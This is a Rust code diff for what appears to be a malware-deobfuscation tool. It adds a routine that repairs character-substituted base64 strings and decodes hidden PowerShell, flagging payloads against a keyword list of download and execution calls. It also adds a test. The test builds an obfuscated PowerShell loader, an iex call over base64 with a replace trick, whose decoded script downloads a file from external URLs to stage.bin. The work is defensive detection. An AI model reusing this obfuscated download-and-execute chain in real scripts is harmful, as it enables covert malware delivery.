@@ -4000,6 +4000,43 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
             report.extracted_ps1_normalized.join("\n---\n")
         );
     }
+
+    #[test]
+    fn damaged_powershell_handoff_regex_replaced_b64_chain_resolves_urls() {
+        let decoded = r#"
+$links = @('https://bitbucket.org/team/repo/downloads/3.jpg','https://paste.sensio.no/ApartAirways')
+Invoke-WebRequest -Uri $links[0] -OutFile stage.bin
+"#;
+        let utf16: Vec<u8> = decoded
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD
+            .encode(&utf16)
+            .replace('r', "f#");
+        let script = format!(
+            "\x02\x03\x03\x03\x03\x03hell \"$ddsdgo = '{b64}';iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($ddsdgo.replace('f#','r'))))\""
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+        let urls: Vec<_> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, .. } | Trait::UrlVariable { url: src, .. } => {
+                    Some(src.as_str())
+                }
+                _ => None,
+            })
+            .collect();
+        assert!(
+            urls.contains(&"https://bitbucket.org/team/repo/downloads/3.jpg")
+                && urls.contains(&"https://paste.sensio.no/ApartAirways"),
+            "damaged handoff regex-replaced b64 URLs missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -4236,6 +4273,91 @@ fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
     if !payloads.iter().any(|existing| existing == &payload) {
         payloads.push(payload);
     }
+}
+
+#[allow(clippy::expect_used)]
+fn pre_scan_repaired_base64_powershell_handoff(input: &[u8], env: &mut Environment) {
+    use base64::Engine as _;
+    use once_cell::sync::Lazy;
+    use regex::Regex;
+
+    static QUOTED_B64ISH_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)['"](?P<body>[A-Za-z0-9+/=\s#]{80,})['"]"#)
+            .expect("quoted b64-ish regex")
+    });
+    static REPLACE_PAIR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:\.|\b)\s*replace\s*\(\s*['"](?P<needle>[^'"]{1,24})['"]\s*,\s*['"](?P<repl>[^'"]{0,24})['"]\s*\)"#,
+        )
+        .expect("replace pair regex")
+    });
+
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("replace") {
+        return;
+    }
+
+    let replacements: Vec<(String, String)> = REPLACE_PAIR_RE
+        .captures_iter(&text)
+        .filter_map(|caps| {
+            Some((
+                caps.name("needle")?.as_str().replace("''", "'"),
+                caps.name("repl")?.as_str().replace("''", "'"),
+            ))
+        })
+        .collect();
+    if replacements.is_empty() {
+        return;
+    }
+
+    for caps in QUOTED_B64ISH_RE.captures_iter(&text) {
+        let Some(body) = caps.name("body") else {
+            continue;
+        };
+        let body = body.as_str();
+        for (needle, repl) in &replacements {
+            if needle.is_empty() || !body.contains(needle) {
+                continue;
+            }
+            let repaired: String = body
+                .replace(needle, repl)
+                .chars()
+                .filter(|ch| !ch.is_whitespace())
+                .collect();
+            if repaired.len() < 80 || !repaired.bytes().all(is_base64_byte) {
+                continue;
+            }
+            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(&repaired) else {
+                continue;
+            };
+            if decoded.len() > 4 * 1024 * 1024 {
+                continue;
+            }
+            let decoded_text = decode_utf16le_extracted_payload(&decoded)
+                .unwrap_or_else(|| String::from_utf8_lossy(&decoded).into_owned());
+            if looks_like_repaired_powershell_payload(&decoded_text) {
+                push_unique_payload(&mut env.all_extracted_ps1, decoded_text.into_bytes());
+            }
+        }
+    }
+}
+
+fn looks_like_repaired_powershell_payload(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("invoke-webrequest")
+        || lower.contains("invoke-restmethod")
+        || lower.contains("downloadstring")
+        || lower.contains("downloadfile")
+        || lower.contains("frombase64string")
+        || lower.contains("[system.")
+        || lower.contains("[text.encoding]")
+        || lower.contains("new-object")
+        || lower.contains("start-process")
+        || lower.contains("iex ")
+        || lower.contains("iex(")
+        || lower.contains("http://")
+        || lower.contains("https://")
 }
 
 fn looks_like_vbs_script(lower: &str) -> bool {
@@ -4771,6 +4893,7 @@ fn analyze_inner(
         let standalone_ps_input = pre_scan_standalone_powershell_input(input, &mut env);
         let standalone_script_input = standalone_vbs_input || standalone_ps_input;
         deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
+        pre_scan_repaired_base64_powershell_handoff(input, &mut env);
         profile_mark!("setup_and_prescan");
         if let Some(decoded) = decode_utf16le_script_blob(input) {
             pre_scan_utf16_script_blob(&decoded, &mut env);
